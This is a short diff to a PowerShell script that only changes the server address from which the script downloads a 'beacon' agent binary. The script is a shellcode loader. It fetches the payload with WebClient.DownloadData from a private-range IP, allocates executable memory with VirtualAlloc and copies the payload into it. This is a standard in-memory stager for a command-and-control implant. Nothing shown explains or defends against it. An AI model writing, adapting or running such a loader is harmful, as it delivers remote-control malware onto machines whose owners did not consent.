@@ -16,7 +16,7 @@ public class PInvoke {
 
 Add-Type $PInvoke
 
-[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.175:8000/beacons/agent_aes_x86.bin')
+[Byte[]] $buf = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.1:80/beacons/agent_aes_x86.bin')
 $size = $buf.Length
 [IntPtr]$addr = [PInvoke]::VirtualAlloc(0, $size, 0x3000, 0x40)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
